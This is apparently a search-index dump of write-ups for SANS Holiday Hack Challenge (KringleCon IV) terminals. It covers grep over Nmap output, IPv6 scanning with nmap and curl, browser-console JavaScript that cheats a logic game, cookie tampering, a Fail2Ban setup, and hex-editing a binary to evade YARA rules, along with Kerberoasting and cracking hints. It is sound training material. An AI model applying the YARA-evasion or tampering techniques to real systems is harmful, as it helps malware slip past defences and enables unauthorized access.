utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body.","title":"Grepping for Gold"},{"location":"hints/h3/#grepping-for-gold","text":"Elf : Greasy GopherGuts Direct link : gnmap terminal Objective : Thaw Frost Tower's Entrance","title":"Grepping for Gold"},{"location":"hints/h3/#request","text":"Greasy GopherGuts Grnph. Blach! Phlegm. I'm Greasy Gopherguts. I need help with parsing some Nmap output. If you help me find some results, I'll give you some hints about Wi-Fi. Click on the terminal next to me and read the instructions. Maybe search for a cheat sheet if the hints in the terminal don't do it for ya'. You'll type quizme in the terminal and grep through the Nmap bigscan.gnmap file to find answers.","title":"Request"},{"location":"hints/h3/#hints","text":"Grep Cheat Sheet Check this out if you need a grep refresher.","title":"Hints"},{"location":"hints/h3/#solution","text":"Welcome message Howdy howdy! Mind helping me with this homew- er, challenge? Someone ran nmap -oG on a big network and produced this bigscan.gnmap file. The quizme program has the questions and hints and, incidentally, has NOTHING to do with an Elf University assignment. Thanks! Answer all the questions in the quizme executable: - What port does 34.76.1.22 have open? - What port does 34.77.207.226 have open? - How many hosts appear \"Up\" in the scan? - How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) - How many hosts with status Up have no (detected) open TCP ports? - What's the greatest number of TCP ports any one host has open? Check out bigscan.gnmap and type quizme to answer each question. Many of the terminals at KringleCon are designed to help you get acquainted with a specific technology or tool. Last year it was a Linux primer , this time around we get to learn all about grep . The Answers section below provides a copy/pastable overview of all commands. All entries also link to explainshell.com which provides a more in-depth explanation. Oh, and if you don't have time for all of that, scroll down a little... Answers Q: What port does 34.76.1.22 have open? C: grep '34.76.1.22' bigscan.gnmap A: 62078 Q: What port does 34.77.207.226 have open? C: grep '34.77.207.226' bigscan.gnmap A: 8080 Q: How many hosts appear \"Up\" in the scan? C: grep -i 'Status: Up' bigscan.gnmap | wc -l A: 26054 Q: How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) C: grep '80/open/tcp\\|443/open/tcp\\|8080/open/tcp' bigscan.gnmap | wc -l A: 14372 Q: How many hosts with status Up have no (detected) open TCP ports? C: echo $(expr $(grep -i 'Status: Up' bigscan.gnmap | wc -l) - $(grep -i '/open/' bigscan.gnmap | wc -l)) A: 402 Q: What's the greatest number of TCP ports any one host has open? C: grep -E '(.*/open/.*///,?\\s){12}' bigscan.gnmap and grep -E '(.*/open/.*///,?\\s){13}' bigscan.gnmap A: 12 Extracting the answers from the quizme binary If putting in the time and effort to learn about grep isn't your thing, then you're in luck! Someone was nice enough to leave a copy of pyi-archive_viewer in /usr/local/bin which you can use to inspect and extract data from executables created with PyInstaller , like /usr/bin/quizme . Start by using pyi-archive_viewer /usr/bin/quizme to view all available components in the quizme binary. Next, extract the quizme component and save it to quizme.bin using x quizme . Finally, use strings quizme.bin | grep question | jq to extract the answers from the quizme.bin file.","title":"Solution"},{"location":"hints/h3/#response","text":"Greasy GopherGuts Grack. Ungh. ... Oh! You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body.","title":"Response"},{"location":"hints/h4/","text":"Logic Munchers \u2693\ufe0e Elf : Noel Boetie Direct link : logicmunchers website Objective : Slot Machine Investigation Request \u2693\ufe0e Noel Boetie Hello there! Noel Boetie here. We're all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know... logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I'm working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints for how to find vulnerabilities. Specifically, I'll give you some tips in finding flaws in some of the web applications I've heard about here at the North Pole, especially those associated with slot machines! Hints \u2693\ufe0e Boolean Logic There are lots of special symbols for logic and set notation. This one covers AND, NOT, and OR at the bottom. AND, OR, NOT, XOR This might be a handy reference too. Solution \u2693\ufe0e To unlock the achievement we need to complete a stage in Potpourri on Intermediate or higher. We can either play the game as intended and learn about boolean logic or we can cheat. Each grid is represented by a JavaScript variable named challenges which contains both the statement shown in each cell as well as the associated true or false result. The chompy.js game code contains a checkWin() function which iterates over this challenges variable and checks if any items are still set to true (i.e., still need to be chomped) and if not, levels up the game. Start a stage in Potpourri on Intermediate or higher and paste the below JavaScript code in your web browser's console. This will set all item results in challenges to false (line 3), satisfying the checkWin() function, and level up the game. Skip to the next level 1 2 3 4 5 6 for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { challenges [ col ][ cell ][ 1 ] = false ; } } checkWin () The autoplay_chompers.js script below takes this a step further by adding a timer that repeats this logic for each new level. The biggest difference with the code snippet above is that it more closely mimics a user playing the game by searching for items in challenges that are set to true and calling a chomp() function on those cells. autoplay_chompers.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // Modified chomp function that checks the cell at position (x,y) function chomp ( x , y ) { if ( challenges [ x ][ y ][ 0 ] != \"\" ) { // Clear the cell document . getElementById ( x + ',' + y ). innerHTML = \"\" ; if ( challenges [ x ][ y ][ 1 ]) { // Update the score score += 100 ; document . getElementById ( \"score\" ). innerHTML = \"<h2>\" + score + \"</h2>\" ; } else { // Leave this in as a sanity check wigwags ( \"Oh no! Ate a wrong answer!\" ) } } challenges [ x ][ y ] = [[],[]]; checkWin (); } // Play the level by chomping each cell containing a true statement function playLevel () { for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { if ( challenges [ col ][ cell ][ 1 ] == true ) { chomp ( col , cell );} } } } // Call playLevel() every 2 seconds setInterval ( playLevel , 2000 ); The chomp() function will verify that the cell's result is in fact true and run through the game mechanics like updating the score, clearing out the cell, and calling checkWin() to level up the game. To use the script, start a new game, paste the contents of autoplay_chompers.js in your web browser's console, sit back, and enjoy the show. Response \u2693\ufe0e Noel Boetie Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox.","title":"Logic Munchers"},{"location":"hints/h4/#logic-munchers","text":"Elf : Noel Boetie Direct link : logicmunchers website Objective : Slot Machine Investigation","title":"Logic Munchers"},{"location":"hints/h4/#request","text":"Noel Boetie Hello there! Noel Boetie here. We're all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know... logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I'm working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints for how to find vulnerabilities. Specifically, I'll give you some tips in finding flaws in some of the web applications I've heard about here at the North Pole, especially those associated with slot machines!","title":"Request"},{"location":"hints/h4/#hints","text":"Boolean Logic There are lots of special symbols for logic and set notation. This one covers AND, NOT, and OR at the bottom. AND, OR, NOT, XOR This might be a handy reference too.","title":"Hints"},{"location":"hints/h4/#solution","text":"To unlock the achievement we need to complete a stage in Potpourri on Intermediate or higher. We can either play the game as intended and learn about boolean logic or we can cheat. Each grid is represented by a JavaScript variable named challenges which contains both the statement shown in each cell as well as the associated true or false result. The chompy.js game code contains a checkWin() function which iterates over this challenges variable and checks if any items are still set to true (i.e., still need to be chomped) and if not, levels up the game. Start a stage in Potpourri on Intermediate or higher and paste the below JavaScript code in your web browser's console. This will set all item results in challenges to false (line 3), satisfying the checkWin() function, and level up the game. Skip to the next level 1 2 3 4 5 6 for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { challenges [ col ][ cell ][ 1 ] = false ; } } checkWin () The autoplay_chompers.js script below takes this a step further by adding a timer that repeats this logic for each new level. The biggest difference with the code snippet above is that it more closely mimics a user playing the game by searching for items in challenges that are set to true and calling a chomp() function on those cells. autoplay_chompers.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // Modified chomp function that checks the cell at position (x,y) function chomp ( x , y ) { if ( challenges [ x ][ y ][ 0 ] != \"\" ) { // Clear the cell document . getElementById ( x + ',' + y ). innerHTML = \"\" ; if ( challenges [ x ][ y ][ 1 ]) { // Update the score score += 100 ; document . getElementById ( \"score\" ). innerHTML = \"<h2>\" + score + \"</h2>\" ; } else { // Leave this in as a sanity check wigwags ( \"Oh no! Ate a wrong answer!\" ) } } challenges [ x ][ y ] = [[],[]]; checkWin (); } // Play the level by chomping each cell containing a true statement function playLevel () { for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { if ( challenges [ col ][ cell ][ 1 ] == true ) { chomp ( col , cell );} } } } // Call playLevel() every 2 seconds setInterval ( playLevel , 2000 ); The chomp() function will verify that the cell's result is in fact true and run through the game mechanics like updating the score, clearing out the cell, and calling checkWin() to level up the game. To use the script, start a new game, paste the contents of autoplay_chompers.js in your web browser's console, sit back, and enjoy the show.","title":"Solution"},{"location":"hints/h4/#response","text":"Noel Boetie Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox.","title":"Response"},{"location":"hints/h5/","text":"IPv6 Sandbox \u2693\ufe0e Elf : Jewel Loggins Direct link : ipv6 terminal Objective : Strange USB Device Request \u2693\ufe0e Jewel Loggins Well hello! I'm Jewel Loggins. I have to say though, I'm a bit distressed. The con next door? Oh sure, I'm concerned about that too, but I was talking about the issues I'm having with IPv6. I mean, I know it's an old protocol now, but I've just never checked it out. So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working! Would you mind taking a look for me on this terminal? I think there's a Github Gist that covers tool usage with IPv6 targets. The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface. I've got a deal for you. If you show me how to solve this terminal, I'll provide you with some nice tips about a topic I've been researching a lot lately \u2013 Ducky Scripts! They can be really interesting and fun! Hints \u2693\ufe0e IPv6 Reference Check out this Github Gist with common tools used in an IPv6 context. Solution \u2693\ufe0e Welcome message Welcome, Kringlecon attendee! The candy striper is running as a service on this terminal, but I can't remember the password. Like a sticky note under the keyboard, I put the password on another machine in this network. Problem is: I don't have the IP address of that other host. Please do what you can to help me out. Find the other machine, retrieve the password, and enter it into the Candy Striper in the pane above. I know you can get it running again! To find all hosts on the local network, ping the all-nodes (i.e., ff02::1) and all-routers (i.e., ff02::2) multicast addresses (lines 1-2). The latter appears to be optional as ip neigh (line 3) indicates which of the 2 devices is the router regardless. Now that we've identified the non-router host as fe80::42:c0ff:fea8:a002 we can run a port scan against it (line 4). Finally, an HTTP GET request using curl on port 80 tells us that the striper's activation phrase, PieceOnEarth , can be found on TCP port 9000 (lines 5-6). Terminal commands 1 2 3 4 5 6 ping6 ff02::1 -c2 # ping the all-nodes multicast address ping6 ff02::2 -c2 # ping the all-routers multicast address (optional) ip neigh # show the neighbour cache which includes hosts and routers nmap -6 fe80::42:c0ff:fea8:a002%eth0 # run a port scan against the non-router host curl http:// [ fe80::42:c0ff:fea8:a002 ] :80/ --interface eth0 # send a GET request to port 80 curl http:// [ fe80::42:c0ff:fea8:a002 ] :9000/ --interface eth0 # send a GET request to port 9000 Answer PieceOnEarth Response \u2693\ufe0e Jewel Loggins Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful?","title":"IPv6 Sandbox"},{"location":"hints/h5/#ipv6-sandbox","text":"Elf : Jewel Loggins Direct link : ipv6 terminal Objective : Strange USB Device","title":"IPv6 Sandbox"},{"location":"hints/h5/#request","text":"Jewel Loggins Well hello! I'm Jewel Loggins. I have to say though, I'm a bit distressed. The con next door? Oh sure, I'm concerned about that too, but I was talking about the issues I'm having with IPv6. I mean, I know it's an old protocol now, but I've just never checked it out. So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working! Would you mind taking a look for me on this terminal? I think there's a Github Gist that covers tool usage with IPv6 targets. The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface. I've got a deal for you. If you show me how to solve this terminal, I'll provide you with some nice tips about a topic I've been researching a lot lately \u2013 Ducky Scripts! They can be really interesting and fun!","title":"Request"},{"location":"hints/h5/#hints","text":"IPv6 Reference Check out this Github Gist with common tools used in an IPv6 context.","title":"Hints"},{"location":"hints/h5/#solution","text":"Welcome message Welcome, Kringlecon attendee! The candy striper is running as a service on this terminal, but I can't remember the password. Like a sticky note under the keyboard, I put the password on another machine in this network. Problem is: I don't have the IP address of that other host. Please do what you can to help me out. Find the other machine, retrieve the password, and enter it into the Candy Striper in the pane above. I know you can get it running again! To find all hosts on the local network, ping the all-nodes (i.e., ff02::1) and all-routers (i.e., ff02::2) multicast addresses (lines 1-2). The latter appears to be optional as ip neigh (line 3) indicates which of the 2 devices is the router regardless. Now that we've identified the non-router host as fe80::42:c0ff:fea8:a002 we can run a port scan against it (line 4). Finally, an HTTP GET request using curl on port 80 tells us that the striper's activation phrase, PieceOnEarth , can be found on TCP port 9000 (lines 5-6). Terminal commands 1 2 3 4 5 6 ping6 ff02::1 -c2 # ping the all-nodes multicast address ping6 ff02::2 -c2 # ping the all-routers multicast address (optional) ip neigh # show the neighbour cache which includes hosts and routers nmap -6 fe80::42:c0ff:fea8:a002%eth0 # run a port scan against the non-router host curl http:// [ fe80::42:c0ff:fea8:a002 ] :80/ --interface eth0 # send a GET request to port 80 curl http:// [ fe80::42:c0ff:fea8:a002 ] :9000/ --interface eth0 # send a GET request to port 9000 Answer PieceOnEarth","title":"Solution"},{"location":"hints/h5/#response","text":"Jewel Loggins Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful?","title":"Response"},{"location":"hints/h6/","text":"Holiday Hero \u2693\ufe0e Elf : Chimney Scissorsticks Direct link : hero website Objective : Shellcode Primer Request \u2693\ufe0e Chimney Scissorsticks Woo! I'm Chimney Scissorsticks, and I'm having a great time up here! I've been hanging out with all these NetWars players and not worrying about what's going on next door. In fact, I've really been having fun playing with this Holiday Hero terminal. You can use it to generate some jamming holiday tunes that help power Santa's sleigh! It's more fun to play with a friend but I've also heard there's a clever way to enable single player mode. Single player mode? I heard it can be enabled by fiddling with two client-side values, one of which is passed to the server. It's so much more fun and easier with a friend though! Either way, we'd really appreciate your help getting the sleigh all fueled up. Then I can get back to thinking about shellcode... Solution \u2693\ufe0e The most fun way to solve this challenge is by teaming up with a friend, but if you want to try out the single player mode that Chimney Scissorsticks refers to you'll need to do two things. First, change the HOHOHO cookie's single_player field to true and refresh the webpage to ensure the updated value is picked up. Next, use option 2 to create a room, change the single_player_mode variable defined in the holidayhero.min.js script to true using the web brower's console, and wait for the message stating \"Player 2 (COMPUTER) has joined!\" to appear on screen. That's it! Single player mode is now active. Toggle the switch on the left console to the ON position and have fun! Response \u2693\ufe0e Chimney Scissorsticks You did it - rock on! We're all set now that the sleigh is fueled! So hey, let me talk to you a bit about manual exploitation. If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. That's it! I know you can do it!","title":"Holiday Hero"},{"location":"hints/h6/#holiday-hero","text":"Elf : Chimney Scissorsticks Direct link : hero website Objective : Shellcode Primer","title":"Holiday Hero"},{"location":"hints/h6/#request","text":"Chimney Scissorsticks Woo! I'm Chimney Scissorsticks, and I'm having a great time up here! I've been hanging out with all these NetWars players and not worrying about what's going on next door. In fact, I've really been having fun playing with this Holiday Hero terminal. You can use it to generate some jamming holiday tunes that help power Santa's sleigh! It's more fun to play with a friend but I've also heard there's a clever way to enable single player mode. Single player mode? I heard it can be enabled by fiddling with two client-side values, one of which is passed to the server. It's so much more fun and easier with a friend though! Either way, we'd really appreciate your help getting the sleigh all fueled up. Then I can get back to thinking about shellcode...","title":"Request"},{"location":"hints/h6/#solution","text":"The most fun way to solve this challenge is by teaming up with a friend, but if you want to try out the single player mode that Chimney Scissorsticks refers to you'll need to do two things. First, change the HOHOHO cookie's single_player field to true and refresh the webpage to ensure the updated value is picked up. Next, use option 2 to create a room, change the single_player_mode variable defined in the holidayhero.min.js script to true using the web brower's console, and wait for the message stating \"Player 2 (COMPUTER) has joined!\" to appear on screen. That's it! Single player mode is now active. Toggle the switch on the left console to the ON position and have fun!","title":"Solution"},{"location":"hints/h6/#response","text":"Chimney Scissorsticks You did it - rock on! We're all set now that the sleigh is fueled! So hey, let me talk to you a bit about manual exploitation. If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. That's it! I know you can do it!","title":"Response"},{"location":"hints/h8/","text":"HoHo... No \u2693\ufe0e Elf : Eve Snowshoes Direct link : hohono terminal Objective : Kerberoasting on an Open Fire Request \u2693\ufe0e Eve Snowshoes Hey there, how's it going? I'm Eve Snowshoes. Lately I've been spending a lot of cycles worrying about what's going on next door. Before that, I was checking out Fail2Ban. It's this slick log scanning tool for Apache web servers. If you can complete this terminal challenge, I'd be happy to give you some things I've learned about Kerberoasting and Active Directory permissions! Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we'll talk Kerberoasting and Active Directory. OK? Solution \u2693\ufe0e Welcome message Jack is trying to break into Santa's workshop! Santa's elves are working 24/7 to manually look through logs, identify the malicious IP addresses, and block them. We need your help to automate this so the elves can get back to making presents! Can you configure Fail2Ban to detect and block the bad IPs? * You must monitor for new log entries in /var/log/hohono.log * If an IP generates 10 or more failure messages within an hour then it must be added to the naughty list by running naughtylist add <ip> /root/naughtylist add 12.34.56.78 * You can also remove an IP with naughtylist del <ip> /root/naughtylist del 12.34.56.78 * You can check which IPs are currently on the naughty list by running /root/naughtylist list You'll be rewarded if you correctly identify all the malicious IPs with a Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in /etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't add any nice IPs to the naughty list! *** IMPORTANT NOTE! *** Fail2Ban won't rescan any logs it has already seen. That means it won't automatically process the log file each time you make changes to the Fail2Ban config. When needed, run /root/naughtylist refresh to re-sample the log file and tell Fail2Ban to reprocess it. Introduction \u2693\ufe0e Andy Smith's KringleCon talk provides a great introduction to Fail2Ban and goes over all the steps required to set up your own custom configuration. In short, there's 3 config files we need to create: a filter, an action, and a jail which ties it all together. Log analysis \u2693\ufe0e Before we start diving into config files though, we first need to analyze /var/log/hohono.log to understand what bad activity actually looks like. Lines containing Valid , successfully , and successful are obviously good and should be ignored. By filtering out the valid log entries using grep -v 'successful\\|Valid' we're left with 4 distinct types of failure messages. Filter configuration \u2693\ufe0e Now that we know what each failure message looks like we can configure Fail2Ban, starting with the /etc/fail2ban/filter.d/hohono.conf filter. This configuration file contains a series of regular expressions matching every possible failure message and uses placeholders like <HOST> to identify and extract the IP address responsible for the activity. /etc/fail2ban/filter.d/hohono.conf 1 2 3 4 5 [ Definition ] failregex = <HOST> sent a malformed request Login from <HOST> rejected due to unknown user name Failed login from <HOST> for .* Invalid heartbeat .* from <HOST> Running fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/hohono.conf validates our custom filter definition. Action configuration \u2693\ufe0e Next we create the /etc/fail2ban/action.d/hohono.conf action which instructs Fail2Ban what commands should be run to ban (line 2) and unban (line 3) an IP address. Just like we used <HOST> to identify and extract the IP address in the filter, we can use <ip> to automatically pass the correct IP address to the naughtylist command. /etc/fail2ban/action.d/hohono.conf 1 2 3 [ Definition ] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip> Jail configuration \u2693\ufe0e The final step to setting up Fail2Ban for our use case is to create an /etc/fail2ban/jail.d/hohono.conf jail which ties together our filter (line 3), action (line 4), /var/log/hohono.log (line 5), and a 10 failures per hour threshold (lines 7-8). /etc/fail2ban/jail.d/hohono.conf 1 2 3 4 5 6 7 8 [ hohono ] enabled = true filter = hohono action = hohono logpath = /var/log/hohono.log bantime = 86400 # 1 day (in seconds) findtime = 3600 # 1 hour (in seconds) maxretry = 10 Bring down the ban hammer! \u2693\ufe0e All the required configuration pieces are now in place. Restart the fail2Ban service using either /etc/init.d/fail2ban restart or service fail2ban restart and check that the hohono jail has been loaded by running fail2ban-client status hohono . The final step is to use /root/naughtylist refresh to force Fail2Ban to rescan the /var/log/hohono.log log file. Response \u2693\ufe0e Eve Snowshoes Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding a domain controller, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propogate throughout the domain.","title":"HoHo... No"},{"location":"hints/h8/#hoho-no","text":"Elf : Eve Snowshoes Direct link : hohono terminal Objective : Kerberoasting on an Open Fire","title":"HoHo... No"},{"location":"hints/h8/#request","text":"Eve Snowshoes Hey there, how's it going? I'm Eve Snowshoes. Lately I've been spending a lot of cycles worrying about what's going on next door. Before that, I was checking out Fail2Ban. It's this slick log scanning tool for Apache web servers. If you can complete this terminal challenge, I'd be happy to give you some things I've learned about Kerberoasting and Active Directory permissions! Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we'll talk Kerberoasting and Active Directory. OK?","title":"Request"},{"location":"hints/h8/#solution","text":"Welcome message Jack is trying to break into Santa's workshop! Santa's elves are working 24/7 to manually look through logs, identify the malicious IP addresses, and block them. We need your help to automate this so the elves can get back to making presents! Can you configure Fail2Ban to detect and block the bad IPs? * You must monitor for new log entries in /var/log/hohono.log * If an IP generates 10 or more failure messages within an hour then it must be added to the naughty list by running naughtylist add <ip> /root/naughtylist add 12.34.56.78 * You can also remove an IP with naughtylist del <ip> /root/naughtylist del 12.34.56.78 * You can check which IPs are currently on the naughty list by running /root/naughtylist list You'll be rewarded if you correctly identify all the malicious IPs with a Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in /etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't add any nice IPs to the naughty list! *** IMPORTANT NOTE! *** Fail2Ban won't rescan any logs it has already seen. That means it won't automatically process the log file each time you make changes to the Fail2Ban config. When needed, run /root/naughtylist refresh to re-sample the log file and tell Fail2Ban to reprocess it.","title":"Solution"},{"location":"hints/h8/#response","text":"Eve Snowshoes Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding a domain controller, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propogate throughout the domain.","title":"Response"},{"location":"hints/h9/","text":"Yara Analysis \u2693\ufe0e Elf : Fitzy Shortstack Direct link : yara terminal Objective : Splunk! Request \u2693\ufe0e Fitzy Shortstack Hiya, I'm Fitzy Shortstack! I was just trying to learn a bit more about YARA with this here Cranberry Pi terminal. I mean, I'm not saying I'm worried about attack threats from that other con next door, but... OK. I AM worried. I've been thinking a bit about how malware might bypass YARA rules. If you can help me solve the issue in this terminal, I'll understand YARA so much better! Would you please check it out so I can learn? And, I'll tell you what \u2013 if you help me with YARA, I'll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules. Solution \u2693\ufe0e Welcome message HELP!!! This critical application is supposed to tell us the sweetness levels of our candy manufacturing output (among other important things), but I can't get it to run. It keeps saying something something yara. Can you take a look and see if you can help get this application to bypass Sparkle Redberry's Yara scanner? If we can identify the rule that is triggering, we might be able change the program to bypass the scanner. We have some tools on the system that might help us get this application going: vim, emacs, nano, yara, and xxd The children will be very disappointed if their candy won't even cause a single cavity. For a one-liner solution, scroll all the way down to the bottom. The goal of this challenge is to modify the the_critical_elf_app binary in such a way that it doesn't trigger any of the YARA rules anymore. Each rule consists of a series of strings and a boolean expression that represents the condition that needs to be met for the rule to match. Start by running ./the_critical_elf_app which prints the message yara_rule_135 ./the_critical_elf_app . We can look up the specifics for this YARA rule in ~/yara_rules/rules.yar . yara_rule_135 1 2 3 4 5 6 7 8 9 10 11 12 rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rule matches because somewhere in the binary there's a candycane string. Create a hex dump of the binary using xxd the_critical_elf_app > the_critical_elf_app.hex and open the file in your favorite editor. Search for candy to find the offending string and change the hex value of one of the letters so the YARA rule doesn't match anymore. In the below example changing 0x61 to 0x40 updates the string to c@ndycane . An ASCII table can help with the ASCII to hex conversion. Updated hex dump Original hex dump Convert the hex dump back to a binary with xxd -r the_critical_elf_app.hex the_critical_elf_app_1 and make it executable using chmod +x the_critical_elf_app_1 . Running the updated binary now triggers yara_rule_1056 . yara_rule_1056 1 2 3 4 5 6 7 8 9 10 11 12 13 rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This time the rule has 2 conditions which both need to match. Open the modified hex dump again and search for both hex strings to determine which one we can safely modify. If a search doesn't find the string you're looking for, trim it down as it might span across multiple lines. {6c 6962 632e 736f 2e36} can't be changed as libc.so.6 is an essential library. {726f 6772 616d 2121} however is fine, regardless of what the ASCII string states. Let's change 0x6f to 0x30 , so we get pr0gram!! . Updated hex dump Original hex dump Just like before, use xxd -r the_critical_elf_app.hex the_critical_elf_app_1 to convert the updated hex dump back to a binary. The chmod +x step can be skipped as the_critical_elf_app_1 is already executable and we're merely writing new data into the file. Running ./the_critical_elf_app_1 once more now tells us it matches yara_rule_1732 . yara_rule_1732 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them } Once again there's a few requirements for the rule to match, one of them being the file needs to be less than 50KB in 